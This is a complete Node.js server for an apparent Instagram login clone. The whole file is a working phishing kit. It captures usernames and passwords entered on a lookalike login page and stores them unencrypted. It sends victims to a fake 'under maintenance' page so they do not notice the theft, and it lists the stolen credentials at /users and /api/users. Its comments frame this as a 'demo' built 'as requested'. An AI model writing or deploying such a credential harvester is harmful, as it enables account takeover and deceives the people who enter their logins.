/**
 * Instagram Login Clone — full-stack server
 * ----------------------------------------
 * Stack: Node.js (built-in http) + SQLite (node:sqlite, built-in).
 * No external dependencies required: `node server.js` is enough.
 *
 * Behaviour:
 *   GET  /            -> responsive login page (public/index.html)
 *   POST /login       -> save username + password (plaintext, as requested)
 *                        then redirect to the "under maintenance" page
 *   GET  /maintenance -> "Server down — please try again later" page
 *   GET  /users       -> simple HTML page listing saved credentials (demo only)
 *   GET  /api/users   -> saved credentials as JSON (demo only)
 *
 * NOTE: passwords are intentionally stored WITHOUT encryption, per the brief.
 */

'use strict';

const http = require('node:http');
const fs = require('node:fs');
const path = require('node:path');
const { DatabaseSync } = require('node:sqlite');

const PORT = Number(process.env.PORT) || 3000;
const HOST = process.env.HOST || '0.0.0.0';

const ROOT_DIR = __dirname;
const PUBLIC_DIR = path.join(ROOT_DIR, 'public');
const DATA_DIR = path.join(ROOT_DIR, 'data');
const DB_PATH = path.join(DATA_DIR, 'instagram.db');

// ---------------------------------------------------------------------------
// Database (plaintext storage)
// ---------------------------------------------------------------------------
fs.mkdirSync(DATA_DIR, { recursive: true });

const db = new DatabaseSync(DB_PATH);
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id         INTEGER PRIMARY KEY AUTOINCREMENT,
    username   TEXT    NOT NULL,
    password   TEXT    NOT NULL,
    created_at TEXT    NOT NULL
  );
`);

const insertUser = db.prepare(
  'INSERT INTO users (username, password, created_at) VALUES (?, ?, ?)'
);
const listUsers = db.prepare(
  'SELECT id, username, password, created_at FROM users ORDER BY id DESC'
);

// ---------------------------------------------------------------------------
// Small HTTP helpers
// ---------------------------------------------------------------------------
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.png': 'image/png',
  '.webp': 'image/webp',
  '.ico': 'image/x-icon',
  '.txt': 'text/plain; charset=utf-8',
};

function send(res, statusCode, contentType, body) {
  res.writeHead(statusCode, {
    'Content-Type': contentType,
    'Content-Length': Buffer.byteLength(body),
  });
  res.end(body);
}

function sendRedirect(res, location) {
  res.writeHead(303, { Location: location });
  res.end();
}

function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function readRequestBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 1e6) {
        reject(new Error('Request body too large'));
        req.destroy();
      }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function serveStatic(req, res, urlPath) {
  if (urlPath === '/') urlPath = '/index.html';

  // Prevent path traversal outside the public directory.
  const safePath = path.normalize(urlPath).replace(/^(\.\.[/\\])+/, '');
  let filePath = path.join(PUBLIC_DIR, safePath);

  if (!filePath.startsWith(PUBLIC_DIR)) {
    send(res, 403, 'text/plain; charset=utf-8', 'Forbidden');
    return;
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      send(res, 404, 'text/plain; charset=utf-8', 'Not found');
      return;
    }
    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';
    fs.readFile(filePath, (readErr, content) => {
      if (readErr) {
        send(res, 500, 'text/plain; charset=utf-8', 'Server error');
        return;
      }
      send(res, 200, contentType, content);
    });
  });
}

// ---------------------------------------------------------------------------
// Route handlers
// ---------------------------------------------------------------------------

function handleLogin(req, res, body) {
  const params = new URLSearchParams(body);
  const username = (params.get('username') || '').trim();
  const password = params.get('password') || '';

  if (!username || !password) {
    sendRedirect(res, '/?error=missing');
    return;
  }
  if (password.length < 6) {
    sendRedirect(res, '/?error=short');
    return;
  }

  // Store credentials WITHOUT encryption — exactly as requested.
  insertUser.run(username, password, new Date().toISOString());

  // After a successful login, the "backend" is down for maintenance.
  sendRedirect(res, '/maintenance');
}

function handleUsersPage(res) {
  const rows = listUsers.all();
  const rowsHtml = rows.length
    ? rows
        .map(
          (r) =>
            `<tr>
               <td>${escapeHtml(r.id)}</td>
               <td>${escapeHtml(r.username)}</td>
               <td>${escapeHtml(r.password)}</td>
               <td>${escapeHtml(r.created_at)}</td>
             </tr>`
        )
        .join('')
    : '<tr><td colspan="4">No logins saved yet.</td></tr>';

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Saved logins (demo)</title>
<style>
  body { background:#000; color:#fff; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; padding:24px; }
  h1 { font-size:18px; font-weight:600; }
  .note { color:#8e8e8e; font-size:13px; margin:8px 0 20px; }
  table { border-collapse:collapse; width:100%; max-width:720px; font-size:13px; }
  th, td { border:1px solid #262626; padding:8px 12px; text-align:left; }
  th { background:#121212; color:#a8a8a8; }
  a { color:#0064e0; text-decoration:none; }
</style>
</head>
<body>
  <h1>Saved logins (stored in plaintext)</h1>
  <p class="note">Demo view only — this confirms credentials are written to the SQLite database without encryption.</p>
  <table>
    <thead><tr><th>#</th><th>Username</th><th>Password</th><th>Created at</th></tr></thead>
    <tbody>${rowsHtml}</tbody>
  </table>
  <p style="margin-top:20px;font-size:13px;"><a href="/">&larr; Back to log in</a></p>
</body>
</html>`;

  send(res, 200, 'text/html; charset=utf-8', html);
}

function handleUsersJson(res) {
  const rows = listUsers.all();
  send(res, 200, 'application/json; charset=utf-8', JSON.stringify(rows, null, 2));
}

// ---------------------------------------------------------------------------
// Server
// ---------------------------------------------------------------------------
const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);
    const { pathname } = url;

    if (req.method === 'POST' && pathname === '/login') {
      const body = await readRequestBody(req);
      handleLogin(req, res, body);
      return;
    }

    if (req.method === 'GET' && pathname === '/maintenance') {
      serveStatic(req, res, '/maintenance.html');
      return;
    }

    if (req.method === 'GET' && pathname === '/users') {
      handleUsersPage(res);
      return;
    }

    if (req.method === 'GET' && pathname === '/api/users') {
      handleUsersJson(res);
      return;
    }

    if (req.method === 'GET') {
      serveStatic(req, res, pathname);
      return;
    }

    send(res, 405, 'text/plain; charset=utf-8', 'Method not allowed');
  } catch (err) {
    // eslint-disable-next-line no-console
    console.error(err);
    send(res, 500, 'text/plain; charset=utf-8', 'Internal server error');
  }
});

server.listen(PORT, HOST, () => {
  // eslint-disable-next-line no-console
  console.log(`Instagram login clone running at http://${HOST}:${PORT}`);
  console.log(`SQLite database: ${DB_PATH}`);
});
